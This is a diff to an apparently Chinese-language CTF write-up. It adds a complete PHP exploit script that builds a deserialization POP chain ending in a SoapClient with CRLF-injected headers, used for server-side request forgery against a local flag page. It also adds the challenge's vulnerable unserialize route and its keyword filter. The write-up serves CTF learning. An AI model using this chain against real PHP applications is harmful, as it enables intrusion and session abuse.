@@ -223,13 +223,72 @@ public function __toString()
 这里的pop链流程
 `HelloWorld_DB::__wakeup`->`Typecho_Db::__contrust(__toString)`->`Typecho_Db_Query::__contrust(this->_adapter=new Soapclient)`
 
-exp
 ```php
+<?php
+class Typecho_Db_Query
+{
+    private $_sqlPreBuild;
+    private $_adapter;
+
+    /**
+     * @throws SoapFault
+     */
+    public function __construct()
+    {
+        $host = "http://127.0.0.1/flag.php";
+        $header = array('X-Forwarded-For: 127.0.0.1','Cookie: PHPSESSID=09iejf3jroh277kirj14795qi3');
+        $this->_sqlPreBuild['action'] = 'SELECT';
+        $this->_adapter = new SoapClient(null, array('location'=>$host, 'user_agent'=>'wuwumonster^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$header),'uri'=> "wuwumonster"));
+    }
+}
+
+class Typecho_Db
+{
+    public function __construct($adapterName, $prefix = 'typecho_')
+    {
+        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
+    }
+}
+class HelloWorld_DB
+{
+    private $coincidence;
+    function __construct()
+    {
+        $this->coincidence = (['hello' => new Typecho_Db_Query(), 'world' => 'typecho_']);
+    }
+    function  __wakeup(){
+        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
+    }
+}
+
+$ser = serialize(new HelloWorld_DB());
+print($ser);
+$ser_b64 = base64_encode($ser);
+print('
+');
+print($ser_b64);
 
 ```
+
 反序列化点的路由
 
 ![](attachments/Pasted%20image%2020230420132110.png)
+
+发现被过滤
+```php
+public function action(){  
+     if(!isset($_SESSION)) session_start();  
+     if(isset($_REQUEST['admin'])) var_dump($_SESSION);  
+     if (isset($_POST['C0incid3nc3'])) {  
+if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)  
+   unserialize(base64_decode($_POST['C0incid3nc3']));  
+else {  
+   echo "Not that easy.";  
+}  
+     } 
+}
+```
+
 
 ## `[RoarCTF 2019]`PHPShe
 
